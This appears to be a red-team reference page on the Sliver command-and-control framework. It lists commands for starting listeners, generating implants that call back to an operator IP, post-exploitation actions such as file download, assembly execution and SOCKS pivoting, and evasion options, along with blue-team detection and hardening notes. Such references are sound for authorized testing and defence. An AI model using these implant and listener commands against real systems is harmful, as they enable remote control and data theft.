---
title: "Sliver C2"
category: "red-team"
tags: ["tools", "c2", "command-and-control", "post-exploitation"]
platform: "agnostic"
mitre: ["T1071", "T1573"]
difficulty: "advanced"
updated: "2026-07-12"
author: "core"
---

# Sliver C2

## TL;DR
Sliver (BishopFox) is a popular open-source command & control framework — a free Cobalt Strike alternative. Cross-platform implants, multiple transports (mTLS/HTTP(S)/DNS/WireGuard), and scriptable operations. Use only in authorized engagements. Broader overview: [c2-matrix](../command-and-control/c2-matrix.md).

## Setup & listeners
```bash
sliver-server                 # or `sliver` client to a remote server
# Start listeners
mtls --lport 8443
https --lport 443
dns --domains c2.example.com
```

## Generate implants
```bash
# Session implant (interactive) over mTLS
generate --mtls 10.10.14.1:8443 --os windows --arch amd64 --save impl.exe
# Beacon (async, jittered — stealthier) over HTTPS
generate beacon --http 10.10.14.1 --os windows --seconds 60 --jitter 30 --save beacon.exe
# Other formats: --format shellcode / shared-lib / service
```

## Operating
```bash
sessions            # interactive callbacks
beacons             # async beacon callbacks
use <id>            # select
# In a session:
info; getuid; ps; ls; download <f>; upload <f>; execute-assembly loader.exe
netstat; screenshot; portfwd; socks5 start        # pivoting
```

## OPSEC features
```text
- Beacon mode with sleep + jitter (reduce beaconing pattern).
- Malleable HTTP C2 profiles (mimic legitimate traffic); redirectors upstream.
- Staged vs stageless payloads; per-implant obfuscation.
- WireGuard / DNS transports for constrained egress.
```

## Detection (Blue Team)
- Beaconing analysis (interval/jitter), JA3/JA3S TLS fingerprints, young/rare domains, DNS entropy.
- Default Sliver profiles/signatures (network + EDR); `execute-assembly` / injection behavior.
- See [c2-matrix](../command-and-control/c2-matrix.md) detection notes.

## Mitigation / Hardening
- Egress allow-listing + TLS inspection + JA3 blocklists; DNS monitoring.
- EDR on process injection / .NET assembly loading; block unknown domains/categories.

## Sources
- [Sliver](https://github.com/BishopFox/sliver) · [Sliver wiki](https://sliver.sh/docs)
